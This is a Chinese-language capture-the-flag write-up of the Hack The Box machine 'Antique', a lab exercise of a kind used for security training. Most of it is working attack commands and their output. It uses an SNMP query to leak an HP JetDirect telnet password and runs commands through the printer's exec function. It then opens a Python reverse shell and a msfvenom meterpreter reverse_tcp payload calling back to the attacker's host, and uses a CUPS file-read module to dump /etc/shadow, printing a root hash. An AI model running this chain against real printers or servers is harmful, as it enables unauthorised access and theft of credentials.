# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
┌──(root💀kali)-[~/htb/Antique]
└─# nmap -sV -Pn 10.10.11.107
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 07:44 EST
Nmap scan report for 10.10.11.107
Host is up (0.39s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.91%I=7%D=11/30%Time=61A61CDF%P=x86_64-pc-linux-gnu%r(NUL
SF:L,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetRe
SF:quest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x
SF:20JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nP
SF:assword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DN
SF:SVersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatus
SF:RequestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20
SF:JetDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nP
SF:assword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword
SF::\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerb
SF:eros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20
SF:JetDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswo
SF:rd:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%
SF:r(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19
SF:,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDir
SF:ect\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\
SF:x20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalS
SF:erver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDir
SF:ect\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x2
SF:0")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,
SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirec
SF:t\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20"
SF:)%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20Jet
SF:Direct\n\nPassword:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 229.74 seconds

```

23端口开了一个telnet服务，nc连上去看看
```
┌──(root💀kali)-[~/htb/Antique]
└─# nc 10.10.11.107 23             

HP JetDirect

ls
Password: 123456
Invalid password

```

问候语是```HP JetDirect```,查了一下是惠普的打印机

需要一个密码才能登陆telnet，但是不需要账号

根据```HP JetDirect telnet```作为关键字在谷歌上找到[这篇文章](https://www.irongeek.com/i.php?page=security/networkprinterhacking)

利用```Getting a JetDirect password remotely using the SNMP vulnerability```的方法，我们输入以下信息

```
──(root💀kali)-[~/htb/Antique]
└─# snmpget -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
Created directory: /var/lib/snmp/cert_indexes
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 

```

把上面的数字拿到[这个hex2text网站](http://www.unit-conversion.info/texttools/hexadecimal/),解得密码是：```P@ssw0rd@123!!123```


用上面的凭证登陆telnet账号
```
┌──(root💀kali)-[~/htb/Antique]
└─# nc 10.10.11.107 23

HP JetDirect


Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
> exec whoami
lp
/var/spool/lpd
> exec find / -name user.txt
/home/lp/user.txt
/var/spool/lpd/user.txt

```
# 提权

查看系统相关信息
```
> exec uname -a
Linux antique 5.13.0-051300-generic #202106272333 SMP Sun Jun 27 23:36:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
> exec python3 --version
Python 3.8.10

```

发现安装了python3，用下面命令反弹一个趁手的shell

>exec python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'


```
┌──(root💀kali)-[~/htb/Antique]
└─# nc -lnvp 4242                                                                                                                                                                                                                            1 ⨯
listening on [any] 4242 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.107] 41100
$ id
id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
$ 

```


我们发现```lpadmin```这个用户组比较可疑，可能可以用于提权，经过谷歌以后，我找到了[这篇文章](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791)

里面提到：

> members of lpadmin can read every file on server via cups

这个用户组的人可以读取系统里面的任意文件，于是继续搜索提权脚本，最后发现一个msf的模块```multi/escalate/cups_root_file_read```可以用于提权

我们先编译一个msf的反弹shell

>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f elf > shell.elf

传到靶机，触发，拿到msf，执行提权脚本
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Sending stage (980808 bytes) to 10.10.11.107
[*] Meterpreter session 2 opened (10.10.14.15:4444 -> 10.10.11.107:52856) at 2021-11-30 11:46:50 -0500

meterpreter > run multi/escalate/cups_root_file_read

[!] SESSION may not be compatible with this module.
[+] User in lpadmin group, continuing...
[+] cupsctl binary found in $PATH
[+] nc binary found in $PATH
[*] Found CUPS 1.6.1
[+] File /etc/shadow (998 bytes) saved to /root/.msf4/loot/20211130114734_default_10.10.11.107_cups_file_read_957992.bin
[*] Cleaning up...
meterpreter > getuid

```

查看```/etc/shadow```文件
```
┌──(root💀kali)-[~/htb/Antique]
└─# cat /root/.msf4/loot/20211130114734_default_10.10.11.107_cups_file_read_957992.bin
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18891:0:99999:7:::  
```

编辑成john可以读取的格式
```
┌──(root💀kali)-[~/htb/Antique]
└─# cat shadow.txt 
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
                                                                                                                                                                                                                      
┌──(root💀kali)-[~/htb/Antique]
└─# unshadow passwd.txt shadow.txt > unshadowed.txt
                                                                                                                                                                                                                      
┌──(root💀kali)-[~/htb/Antique]
└─# cat unshadowed.txt 
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:0:0:root:/root:/bin/bash

```

但是我没办法爆破出这个密码

于是转换思路，root下会不会有```id_rsa```文件
编辑msf模块
```
msf6 > use multi/escalate/cups_root_file_read
msf6 post(multi/escalate/cups_root_file_read) > edit

```

把46行改成```/root/.ssh/id_rsa```

编辑保存

下载到本地
```
meterpreter > run multi/escalate/cups_root_file_read

[!] SESSION may not be compatible with this module.
[+] User in lpadmin group, continuing...
[+] cupsctl binary found in $PATH
[+] nc binary found in $PATH
[*] Found CUPS 1.6.1
[+] File /root/.ssh/id_rsa (341 bytes) saved to /root/.msf4/loot/20211130120322_default_10.10.11.107_cups_file_read_145418.bin
[*] Cleaning up...

```

然而没有这个文件：
```
┌──(root💀kali)-[~]
└─# cat /root/.msf4/loot/20211130120601_default_10.10.11.107_cups_file_read_604992.bin
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>Not Found - CUPS v1.6.1</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
</HEAD>
<BODY>
<H1>Not Found</H1>
<P></P>
</BODY>
</HTML>   
```


最后只好把```/root/root.txt```下载到本地，弄完已经凌晨一点多，算是结束这次渗透
```
meterpreter > run multi/escalate/cups_root_file_read

[!] SESSION may not be compatible with this module.
[+] User in lpadmin group, continuing...
[+] cupsctl binary found in $PATH
[+] nc binary found in $PATH
[*] Found CUPS 1.6.1
[+] File /root/root.txt (32 bytes) saved to /root/.msf4/loot/20211130120724_default_10.10.11.107_cups_file_read_556098.txt
[*] Cleaning up...

```

